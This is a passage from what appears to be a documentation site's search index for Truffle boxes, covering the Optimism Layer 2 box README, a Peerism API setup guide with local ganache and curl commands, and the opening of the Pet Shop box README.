Optimistic Layer 2 networks to choose from, prepackaged in this box (note: Layer 1 networks associated with Optimism are included in the regular `truffle-config.js` file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): - `optimistic_ethereum`: This network is the default Layer 1/Layer 2 integration provided by Optimism for testing your Optimistic Ethereum code. Documentation about this setup can be found [here](https://github.com/ethereum-optimism/optimism). * You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run `npm run installLocalOptimism`. You should only need to run this initiation command once. It will create an `optimism` directory in this project that will house the repository you need. If at any point you want to update to the latest optimism docker image, you can delete your `optimism` directory and run this command again. * If you wish to use this network, be sure to run `npm run startLocalOptimism` so that the optimism test ecosystem docker image can be served. For our purposes, you should be able to compile, migrate, and test against this network once the docker image is fully running. See [documentation and updates](https://github.com/ethereum-optimism/optimism/tree/develop/ops) about this docker container for additional information. * Please note, after running `npm run startLocalOptimism` it can take several minutes for the test ecosystem to be up and running on your local machine. The first time you run this command, it will take a bit longer for everything to be set up. Future runs will be quicker! * To stop the local docker container, use `npm run stopLocalOptimism` in a new terminal tab to ensure graceful shutdown. - `ganache`: This network uses an optimistic ganache instance for migrations. The usage is essentially identical to use of regular ganache. - `optimistic_kovan`: Optimism has deployed a testnet to the Kovan network. The RPC endpoint is https://optimism-kovan.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest [MetaMask](https://metamask.io/)). Save your seed phrase in a `.env` file as `KOVAN_MNEMONIC`. Using an `.env` file for the mnemonic is safer practice because it is listed in `.gitignore` and thus will not be committed. * Currently, we have the gasPrice for transactions on Optimistic Kovan set to zero. You should be able to use this network as configured at this time. * You will need Kovan ETH in an Optimistic Kovan wallet to deploy contracts using this network. In order to deploy to Optimistic Kovan, you will need to acquire Optimistic Kovan ETH. As of this writing, there is not an Optimistic Kovan ETH faucet. In order to get Optimistic Kovan ETH, follow these steps: 1) Acquire ETH for your Kovan wallet on MetaMask using a Kovan faucet. 2) Add Optimistic Ethereum as a Custom RPC to your Metamask wallet, using the [steps here](https://community.optimism.io/docs/developers/metamask.html#connecting-manually), except set the RPC URL to `https://optimism-kovan.infura.io/v3/\" + <infuraKey>` 3) Visit [this website](https://gateway.optimism.io/) to bridge your Kovan ETH to Optimistic Kovan ETH 4) Ensure that your `optimistic_kovan` network in `truffle-config.ovm.js` is connected to your Optimistic Kovan wallet. _Note: You may get an error about the block limit being exceeded. The Truffle team is working on this issue, but in the meantime you can add this line before the deployment in your `migrations/1_deploy_contracts.js` file: `SimpleStorage.gasMultiplier = 0.9;`_ Layer 1 networks are included in the `truffle-config.js` file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract (they do not have to be identical!). One example is an ERC20 contract that is deployed on an Optimistic Ethereum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found [here](http://community.optimism.io/docs/developers/integration.html#bridging-l1-and-l2). If you would like to migrate previously migrated contracts on the same network, you can run `truffle migrate --config truffle-config.ovm.js --network=(ganache | optimistic_ethereum | optimistic_kovan)` and add the `--reset` flag. ## Basic Commands The code here will allow you to compile, migrate, and test your code against an Optimistic Ethereum instance. The following commands can be run (more details on each can be found in the next section): To compile: ``` npm run compile:ovm ``` To migrate: ``` npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) ``` To test: ``` npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) ``` ### Testing Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) ``` Remember that there are some differences between the EVM and the OVM, and refer to the Optimism documentation if you run into test failures. Communication Between Ethereum and Optimism Chains \u00b6 The information above should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Optimism ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full optimism integration! Support \u00b6 Support for this box is available via the Truffle community available here .","title":"Optimism Box"},{"location":"boxes/optimism/index.html#optimism-box","text":"Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Optimistic Ethereum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Optimism Chains Support Table of contents generated with markdown-toc This Truffle Optimism Box provides you with the boilerplate structure necessary to start coding for Optimism's Ethereum Layer 2 solution. For detailed information on how Optimism works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Optimism without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Optimistic Solidity code against a variety of Optimism test networks. Optimism's Layer 2 solution is almost fully compatible with the EVM, though it uses an \"optimistic\" EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. You can see the complete list of differences between Optimism's fork of the solc compiler and the original here .","title":"Optimism Box"},{"location":"boxes/optimism/index.html#requirements","text":"The Optimism Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account","title":"Requirements"},{"location":"boxes/optimism/index.html#installation","text":"Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/optimism-box ). $ truffle unbox optimism","title":"Installation"},{"location":"boxes/optimism/index.html#setup","text":"","title":"Setup"},{"location":"boxes/optimism/index.html#using-the-env-file","text":"You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GANACHE_MNEMONIC and a KOVAN_MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the optimistic network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\" INFURA_KEY=\"<Your Infura Project ID>\" GANACHE_MNEMONIC=\"<Your Ganache Mnemonic>\" KOVAN_MNEMONIC=\"<Your Kovan Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local optimistic ethereum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .","title":"Using the env File"},{"location":"boxes/optimism/index.html#new-configuration-file","text":"A new configuration file exists in this project: truffle-config.ovm.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Optimism contracts and lists several networks for running the Optimism Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder.","title":"New Configuration File"},{"location":"boxes/optimism/index.html#new-directory-structure-for-artifacts","text":"When you compile or migrate, the resulting json files will be at build/optimism-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference!","title":"New Directory Structure for Artifacts"},{"location":"boxes/optimism/index.html#optimistic-ethereum","text":"","title":"Optimistic Ethereum"},{"location":"boxes/optimism/index.html#compiling","text":"To compile your project using the Optimistic solc compiler, run the following in your terminal: npm run compile:ovm This script lets Truffle know to use the truffle-config.ovm.js configuration file, which references the Optimistic solc compiler. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between solc and optimistic solc ! Please note: the optimistic solc compiler we have included relies on the latest version of the package, and currently uses version 0.7.6 . If you would like to use a different version of solc , see the available optimistic versions here , and run: npm install @eth-optimism/solc@<YourVersion> ``` You can double check that you have the version you want by looking at the `package.json` dependencies in this project. If you would like to recompile previously compiled contracts, you can manually run this command with `truffle compile --config truffle-config.ovm.js` and add the `--all` flag. ### Migrating To migrate on an Optimistic Layer 2, run: npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) (remember to choose a network from these options!). You have several Optimistic Layer 2 networks to choose from, prepackaged in this box (note: Layer 1 networks associated with Optimism are included in the regular `truffle-config.js` file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): - `optimistic_ethereum`: This network is the default Layer 1/Layer 2 integration provided by Optimism for testing your Optimistic Ethereum code. Documentation about this setup can be found [here](https://github.com/ethereum-optimism/optimism). * You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run `npm run installLocalOptimism`. You should only need to run this initiation command once. It will create an `optimism` directory in this project that will house the repository you need. If at any point you want to update to the latest optimism docker image, you can delete your `optimism` directory and run this command again. * If you wish to use this network, be sure to run `npm run startLocalOptimism` so that the optimism test ecosystem docker image can be served. For our purposes, you should be able to compile, migrate, and test against this network once the docker image is fully running. See [documentation and updates](https://github.com/ethereum-optimism/optimism/tree/develop/ops) about this docker container for additional information. * Please note, after running `npm run startLocalOptimism` it can take several minutes for the test ecosystem to be up and running on your local machine. The first time you run this command, it will take a bit longer for everything to be set up. Future runs will be quicker! * To stop the local docker container, use `npm run stopLocalOptimism` in a new terminal tab to ensure graceful shutdown. - `ganache`: This network uses an optimistic ganache instance for migrations. The usage is essentially identical to use of regular ganache. - `optimistic_kovan`: Optimism has deployed a testnet to the Kovan network. The RPC endpoint is https://optimism-kovan.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest [MetaMask](https://metamask.io/)). Save your seed phrase in a `.env` file as `KOVAN_MNEMONIC`. Using an `.env` file for the mnemonic is safer practice because it is listed in `.gitignore` and thus will not be committed. * Currently, we have the gasPrice for transactions on Optimistic Kovan set to zero. You should be able to use this network as configured at this time. * You will need Kovan ETH in an Optimistic Kovan wallet to deploy contracts using this network. In order to deploy to Optimistic Kovan, you will need to acquire Optimistic Kovan ETH. As of this writing, there is not an Optimistic Kovan ETH faucet. In order to get Optimistic Kovan ETH, follow these steps: 1) Acquire ETH for your Kovan wallet on MetaMask using a Kovan faucet. 2) Add Optimistic Ethereum as a Custom RPC to your Metamask wallet, using the [steps here](https://community.optimism.io/docs/developers/metamask.html#connecting-manually), except set the RPC URL to `https://optimism-kovan.infura.io/v3/\" + <infuraKey>` 3) Visit [this website](https://gateway.optimism.io/) to bridge your Kovan ETH to Optimistic Kovan ETH 4) Ensure that your `optimistic_kovan` network in `truffle-config.ovm.js` is connected to your Optimistic Kovan wallet. _Note: You may get an error about the block limit being exceeded. The Truffle team is working on this issue, but in the meantime you can add this line before the deployment in your `migrations/1_deploy_contracts.js` file: `SimpleStorage.gasMultiplier = 0.9;`_ Layer 1 networks are included in the `truffle-config.js` file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract (they do not have to be identical!). One example is an ERC20 contract that is deployed on an Optimistic Ethereum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found [here](http://community.optimism.io/docs/developers/integration.html#bridging-l1-and-l2). If you would like to migrate previously migrated contracts on the same network, you can run `truffle migrate --config truffle-config.ovm.js --network=(ganache | optimistic_ethereum | optimistic_kovan)` and add the `--reset` flag. ## Basic Commands The code here will allow you to compile, migrate, and test your code against an Optimistic Ethereum instance. The following commands can be run (more details on each can be found in the next section): To compile: ``` npm run compile:ovm ``` To migrate: ``` npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) ``` To test: ``` npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) ``` ### Testing Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) ``` Remember that there are some differences between the EVM and the OVM, and refer to the Optimism documentation if you run into test failures.","title":"Compiling"},{"location":"boxes/optimism/index.html#communication-between-ethereum-and-optimism-chains","text":"The information above should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Optimism ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full optimism integration!","title":"Communication Between Ethereum and Optimism Chains"},{"location":"boxes/optimism/index.html#support","text":"Support for this box is available via the Truffle community available here .","title":"Support"},{"location":"boxes/peerai-api/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS peerai-api CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# README\\n\\n---\\nPEER-AI\\n---\\n\\n* About - Peerism API built with Truffle, Node.js, Express.js, Mongoose, MongoDB, Solidity, and Ganache CLI (TestRPC).\\n\\n* Instructions - Setup instructions (for macOS) are provided in the [Quick Start Guide](https://github.com/peerism/peerai-api#quick-start-guide-) shown below.\\n\\n* Usage Capabilities - Use cURL to simulate a HTTP POST request to a Peerism API endpoint (instead of sending a request from the Peerism React Native \\xc3\\x90App https://github.com/peerism/peer.ai). Alternatively allows triggering Middleware functions individually. API routes use an Express.js Middleware Chain that allow a request to compile the Peerism Smart Contract using Solidity Compiler (Solc) and Ether Pudding, then deploy it to the Ethereum TestRPC test network blockchain and responds with the contract address.\\n\\n# Table of Contents\\n * [Quick Start Guide](#chapter-0)\\n * [Log](#chapter-log)\\n * [FAQ](#chapter-faq)\\n * [TODO](#chapter-todo)\\n * [References](#chapter-references)\\n\\n## Quick Start Guide \\n\\n* Terminal Tab #1 - Install dependencies including Ganache CLI (TestRPC from the Truffle Suite)\\n ```\\n nvm install v9.3.0;\\n nvm use;\\n nvm use v9.3.0;\\n yarn install;\\n npm install -g ganache-cli\\n ```\\n\\n* Terminal Tab #1 - Run MongoDB Server in a separate Terminal tab\\n ```\\n mongod\\n ```\\n\\n* Terminal Tab #2 - Run Ethereum Client using Ganache CLI (TestRPC).\\n\\n```\\nrm -rf ./db;\\nmkdir -p db/chaindb;\\nganache-cli --account \\'0x0000000000000000000000000000000000000000000000000000000000000001, 10002471238800000000000\\' \\\\\\n --account \\'0x0000000000000000000000000000000000000000000000000000000000000002, 10004471238800000000000\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000001\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000002\\' \\\\\\n --unlock \\'0x7e5f4552091a69125d5dfcb7b8c2659029395bdf\\' \\\\\\n --unlock \\'0x2b5ad5c4795c026514f8317c7a215e218dccd6cf\\' \\\\\\n --blocktime 0 \\\\\\n --deterministic true \\\\\\n --port 8545 \\\\\\n --hostname localhost \\\\\\n --gasPrice 20000000000 \\\\\\n --gasLimit 0x8000000 \\\\\\n --debug true \\\\\\n --mem true \\\\\\n --networkId 1337 \\\\\\n --db \\'./db/chaindb\\'\\n```\\n\\n* Terminal Tab #3 - Compile and Deploy Smart Contracts to TestRPC blockchain\\n\\n * Compile Smart Contracts\\n\\n * Option 1: Generates build/contracts/Peerism.sol.js\\n ```\\n node lib/compileContract.js Peerism\\n ```\\n\\n * Option 2: Genertes build/contracts/Peerism.json (DEPRECATED)\\n ```\\n truffle compile --compile-all;\\n ```\\n\\n * Deploy Smart Contracts\\n\\n * Option 1: Deploy without Truffle\\n\\n * Modify Bitcore dependency before running the next command to avoid error `Error: More than one instance of bitcore-lib found. Please make sure to require bitcore-lib and check that submodules do not also include their own bitcore-lib dependency.`, as described here: https://github.com/bitpay/bitcore/issues/1454, by opening node_modules/bitcore-mnemonic/node_modules/bitcore-lib/index.js and commented out the following lines of code to avoid an error.\\n ```\\n bitcore.versionGuard = function(version) {\\n // if (version !== undefined) {\\n // var message = \\'More than one instance of bitcore-lib found. \\' +\\n // \\'Please make sure to require bitcore-lib and check that submodules do\\' +\\n // \\' not also include their own bitcore-lib dependency.\\';\\n // throw new Error(message);\\n // }\\n };\\n ```\\n\\n ```\\n node lib/deployContract.js Peerism\\n ```\\n\\n * Option 2: Deploy with Truffle (DEPRECATED)\\n ```\\n truffle migrate --reset --network development;\\n ```\\n\\n * Note: Watch the deployment transactions being send to the blockchain in Terminal Tab #2\\n\\n* Terminal Tab #3 - Run Tests\\n ```\\n truffle test;\\n ```\\n\\n* Terminal Tab #4 - Drop the server. Run server, then try cURL requests\\n ```\\n yarn run drop; yarn run dev;\\n ``` \\n\\n* Terminal Tab #4 - Send request to server and receive response for authentication and authorisation to access specific API endpoints.\\n * cURL\\n * Register with email/password. JWT provided in response (i.e. `{\"token\":\"xyz\"}`)\\n ```\\n curl -v -X POST http://localhost:7000/users/auth/register -d \"email=luke@schoen.com&password=123456&name=Luke\" -H \"Content-Type: application/x-www-form-urlencoded\"\\n curl -v -X POST http://localhost:7000/users/auth/register -d \\'{\"email\":\"gavin@wood.com\", \"password\":\"123456\", \"name\":\"Gavin\"}\\' -H \"Content-Type: application/json\"\\n ```\\n * Sign in with email/password. JWT provided in response (i.e. `{\"token\":\"xyz\"}`)\\n ```\\n curl -v -X POST http://localhost:7000/users/auth -d \"email=luke@schoen.com&password=123456\" -H \"Content-Type: application/x-www-form-urlencoded\"\\n curl -v -X POST http://localhost:7000/users/auth -d \\'{\"email\":\"gavin@wood.com\", \"password\":\"123456\"}\\' -H \"Content-Type: application/json\"\\n ```\\n * Access a restricted endpoint by providing JWT\\n ```\\n curl -v -X GET http://localhost:7000/users -H \"Content-Type: application/json\" -H \"Authorization: Bearer \"\\n ```\\n * Create user by providing JWT\\n ```\\n curl -v -X POST http://localhost:7000/users/create --data \\'[{\"email\":\"test@fake.com\", \"name\":\"Test\"}]\\' -H \"Content-Type: application/json\" -H \"Authorization: JWT \"\\n curl -v -X POST http://localhost:7000/users/create -d \"email=test2@fake.com&name=Test2\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Authorization: JWT \"\\n ```\\n\\n* Terminal Tab #4 - Send request to server with Smart Contract Name to be Compiled and Deployed to the Ethereum TestRPC and receive response with the Contract Address.\\n * cURL\\n ```\\n curl -v -X POST http://localhost:7000/contracts/generate -d \\'{\"contractName\":\"Peerism\"}\\' -H \"Content-Type: application/json\"\\n ```\\n\\n* Terminal Tab #4 - Experiment in REPL\\n\\n * Use Truffle Console\\n\\n * Run Truffle Console\\n ```\\n truffle console --network development;\\n ```\\n\\n * Run commands\\n ```\\n web3\\n web3.currentProvider\\n web3.eth.getBalance(\\'0x7e5f4552091a69125d5dfcb7b8c2659029395bdf\\')\\n ```\\n\\n * Attach to EthereumJS TestRPC using Go Ethereum (Geth)\\n * [Install Geth](https://github.com/ethereum/go-ethereum/wiki/Installation-Instructions-for-Mac)\\n\\n * Start Geth JavaScript console\\n\\n ```\\n geth attach rpc:http://localhost:8545\\n ```\\n\\n * Run commands\\n\\n ```\\n web3\\n web3.currentProvider\\n web3.eth.getBalance(\\'0x7e5f4552091a69125d5dfcb7b8c2659029395bdf\\')\\n eth.accounts\\n ```\\n\\n * Optional: Try to perform RPC calls to Ganache TestRPC using cURL. https://github.com/trufflesuite/ganache-cli/issues/383\\n\\n* Terminal Tab #5 - Run Tests on port 7111\\n ```\\n yarn run drop; yarn run test-watch\\n ```\\n\\n* Terminal Tab #1 - Drop the database. Seed the database\\n ```\\n yarn run drop;\\n yarn run seed;\\n ```\\n\\n## Log \\n\\n* Initial setup\\n ```\\n git init; touch README.md; touch .gitignore;\\n code .;\\n ```\\n * [Add boilerplate contents to .gitignore for Node.js](https://github.com/github/gitignore/blob/master/Node.gitignore)\\n\\n* Setup API\\n ```\\n yarn init -y; \\n yarn add express body-parser;\\n yarn add nodemon --dev;\\n touch server.js;\\n ```\\n* Add boilerplate contents to server.js\\n* Add \"dev\" in \"scripts\" section of package.json\\n\\n* Add Mongoose\\n ```\\n yarn add mongoose;\\n mkdir models; touch models/init.js;\\n touch models/User.js;\\n touch models/seeds.js;\\n touch models/drop.js\\n ```\\n\\n* Create Models for Mongoose\\n* Add boilerplate contents to models\\n* Add scripts to package.json\\n\\n* Run MongoDB Server\\n ```\\n mongod\\n ```\\n\\n* MongoDB Client\\n ```\\n mongo\\n\\n show dbs\\n use peerai\\n show collections\\n db.users.find({})\\n db.skills.find({})\\n ```\\n\\n* Create routes\\n ```\\n mkdir routes\\n ```\\n* Modify server.js. Add routes/users.js\\n\\n* Add authentication with [Passport, Passport-Local, and Passport-Local-Mongoose](https://github.com/saintedlama/passport-local-mongoose):\\n ```\\n yarn add passport passport-local passport-local-mongoose\\n ```\\n* Rename Person and people to User and users\\n* Add User Registration route\\n* Add User Sign in route\\n* Add JWT library to return a token instead of a user\\n ```\\n yarn add jsonwebtoken;\\n ```\\n* Add Passport JWT library\\n ```\\n yarn add passport-jwt\\n ```\\n* Add restricted endpoint that requires valid JWT to access\\n* Add Controllers https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes\\n* Add Route Tests\\n ```\\n yarn add mocha chai chai-http --dev;\\n mkdir -p test/routes;\\n touch test/routes/users_test.js;\\n ```\\n* Add Model Tests\\n ```\\n mkdir test/models;\\n touch test/models/users_test.js\\n ```\\n* Add Dotenv library to use different database in development and testing\\n ```\\n yarn add lodash;\\n yarn add dotenv --dev;\\n touch .sample-env;\\n echo \\'NODE_ENV=development\\' >> ./.sample-env;\\n ```\\n* Add Ethereum dependencies including TestRPC\\n ```\\n yarn add web3@0.19 ethereumjs-util@4.4 ethereumjs-tx@1.3 eth-lightwallet@2.5;\\n yarn add ethereumjs-testrpc --dev;\\n yarn add solc ether-pudding --dev;\\n yarn add truffle-artifactor --dev;\\n ```\\n * References\\n * https://medium.com/@codetractio/try-out-ethereum-using-only-nodejs-and-npm-eabaaaf97c80\\n * Smart Contracts without Truffle - https://medium.com/@doart3/ethereum-dapps-without-truffle-compile-deploy-use-it-e6daeefcf919\\n * EthereumJS Util - Library for cryptographic hashes for Ethereum addresses - https://github.com/ethereumjs/ethereumjs-util\\n * EthereumJS Tx - library to create, edit, and sign Ethereum transactions - https://github.com/ethereumjs/ethereumjs-tx\\n * EthereumJS LightWallet - https://github.com/ConsenSys/eth-lightwallet\\n * Solc - Compile Solidity Contract - https://www.npmjs.com/package/solc\\n * Ether Pudding - Manage Solidity Contracts and Packages - https://www.npmjs.com/package/ether-pudding\\n * Truffle Artifactor - replaces Ether Pudding - https://github.com/trufflesuite/truffle-artifactor\\n * Reading from JSON files - https://www.codementor.io/codementorteam/how-to-use-json-files-in-node-js-85hndqt32\\n\\n* Problem: Tried to manually compile using Solc with `node lib/compileContract.js ConvertLib`, which generates ConvertLib.solc.js in build/contracts. However it does not compile MetaCoin.sol, as it returns error `1:27: ParserError: Source \"ConvertLib.sol\" not found: File not supplied initially.\\\\n ... import \"./ConvertLib.sol\"`.\\n * Solution: Use Truffle to compile Solidity contracts with `truffle compile --compile-all`\\n\\n* Run shell script in new Terminal tab (copy from https://github.com/ltfschoen/solidity_test/blob/master/testrpc.sh)\\n ```\\n rm -rf ./db;\\n mkdir db && mkdir db/chaindb;\\n cd ~/code/blockchain/solidity_test; testrpc --account \\'0x0000000000000000000000000000000000000000000000000000000000000001, 10002471238800000000000\\' \\\\\\n --account \\'0x0000000000000000000000000000000000000000000000000000000000000002, 10004471238800000000000\\' \\\\\\n --account \\'0x0000000000000000000000000000000000000000000000000000000000000003, 10004471238800000000000\\' \\\\\\n --account \\'0x0000000000000000000000000000000000000000000000000000000000000004, 10004471238800000000000\\' \\\\\\n --account \\'0x0000000000000000000000000000000000000000000000000000000000000005, 10004471238800000000000\\' \\\\\\n --account \\'0x0000000000000000000000000000000000000000000000000000000000000006, 10004471238800000000000\\' \\\\\\n --account \\'0x0000000000000000000000000000000000000000000000000000000000000007, 10004471238800000000000\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000001\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000002\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000003\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000004\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000005\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000006\\' \\\\\\n --unlock \\'0x0000000000000000000000000000000000000000000000000000000000000007\\' \\\\\\n --unlock \\'0x7e5f4552091a69125d5dfcb7b8c2659029395bdf\\' \\\\\\n --unlock \\'0x2b5ad5c4795c026514f8317c7a215e218dccd6cf\\' \\\\\\n --blocktime 0 \\\\\\n --deterministic true \\\\\\n --port 8545 \\\\\\n --hostname localhost \\\\\\n --gasPrice 20000000000 \\\\\\n --gasLimit 1000000 \\\\\\n --debug true \\\\\\n --mem true \\\\\\n --db \\'./db/chaindb\\'\\n ```\\n* Install Truffle\\n ```\\n npm install -g truffle;\\n truffle init;\\n ```\\n* Run Truffle Unbox in separate directory to get template Metacoin example and move relevant boilerplate contracts and tests into the the root folder\\n* Update package.json tests script to run tests for Smart Contracts and API tests:\\n ```\\n \"test\": \"truffle test; NODE_ENV=testing mocha --recursive test/**/*_test.js\",\\n ```\\n* Remove truffle-config.js and add the following to truffle.js:\\n ```\\n module.exports = {\\n // http://truffleframework.com/docs/advanced/configuration\\n networks: {\\n development: {\\n host: \"localhost\",\\n port: 8545,\\n network_id: \"*\" // Match any network id\\n }\\n }\\n };\\n ```\\n* Add ethpm.json for EthPM Package Management \\n ```\\n {\\n \"package_name\": \"truffle-box-peerism-api-node-express\",\\n \"version\": \"0.0.1\",\\n \"description\": \"Truffle Box of Peerism API built with Truffle, Node.js, Express.js,\\n Solidity, Ether Pudding, and Ethereum TestRPC\",\\n \"authors\": [\\n \"Luke Schoen \"\\n ],\\n \"keywords\": [\\n \"ethereum\",\\n \"express.js\",\\n \"node.js\",\\n \"middleware\",\\n \"api\"\\n ],\\n \"license\": \"MIT\"\\n }\\n ```\\n * References: \\n * http://truffleframework.com/docs/getting_started/packages-ethpm\\n\\n* Open node_modules/bitcore-mnemonic/node_modules/bitcore-lib/index.js and commented out the following lines of code to avoid an error.\\n ```\\n bitcore.versionGuard = function(version) {\\n // if (version !== undefined) {\\n // var message = \\'More than one instance of bitcore-lib found. \\' +\\n // \\'Please make sure to require bitcore-lib and check that submodules do\\' +\\n // \\' not also include their own bitcore-lib dependency.\\';\\n // throw new Error(message);\\n // }\\n };\\n ```\\n\\n* Run Truffle Console experimentation\\n ```\\n truffle console --network development;\\n ```\\n\\n* Build script for Smart Contract (generates .sol.js file in build/contracts/)\\n ```\\n mkdir lib;\\n node lib/compileContract.js Peerism\\n ```\\n * Alternatively compile with Truffle\\n\\n* Deployment script for Smart Contract\\n * Reference: https://medium.com/@codetractio/try-out-ethereum-using-only-nodejs-and-npm-eabaaaf97c80\\n ```\\n touch lib/deployContract.js;\\n node lib/deployContract.js Peerism;\\n ```\\n * References:\\n * http://truffleframework.com/docs/getting_started/contracts\\n * Gas Limits - https://bitcoin.stackexchange.com/questions/39132/what-is-gas-limit-in-ethereum\\n\\n## FAQ \\n\\n* How to understand how to use Passport JWT library?\\n * Refer to the library codebase on Github or in node_modules/jsonwebtoken/ i.e. [verify.js](https://github.com/auth0/node-jsonwebtoken/blob/master/verify.js)\\n * Use breakpoints\\n * Experiment using Node. i.e. Run `node` then\\n ```\\n npm install jsonwebtoken\\n\\n const JWT = require(\\'jsonwebtoken\\');\\n JWT.decode(\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Imx0ZnNjaG9lbkBnbWFpbC5jb20iLCJpYXQiOjE1MTMwNjY3NTEsImV4cCI6MTUxMzY3MTU1MSwic3ViIjoiNWEyZjkwZmZiNTI5YjI0YzM5MTA1NWM3In0.MkcCR1YD2c21x_WOQObyY-UPAQDWTcooOiO69saUVMI\")\\n ```\\n\\n## References \\n\\n* [Express.js server API with JWT authorisation](https://www.youtube.com/watch?v=ggv3rnaHuK8)\\n* [Express.js Routes](https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes)\\n\\n## TODO \\n\\n* [ ] Integrate with [Peerism React Native app](https://github.com/peerism/peer.ai)\\n* [X] Integrate Solidity smart contract using TestRPC\\n* [ ] Create a Truffle Box\\n * https://github.com/trufflesuite/truffle/issues/433\\n * http://truffleframework.com/boxes/\\n* [ ] Upgrade to latest Web3 1.0.0 Beta-27 that has been successfully used in\\nhttps://github.com/ltfschoen/geth-node to deploy a FixedSupplyToken.sol smart contract to a Private Network with Geth'","title":"Index"},{"location":"boxes/pet-shop/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS pet-shop-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Pet Shop Truffle Box\\n\\nThis box has all you need to get started with our [Pet Shop tutorial](http://truffleframework.com/tutorials/pet-shop).\\n\\n## Installation\\n\\n1. Install Truffle globally.\\n ```javascript\\n npm install -g truffle\\n ```\\n\\n2. Download the box. This also takes care of installing the necessary 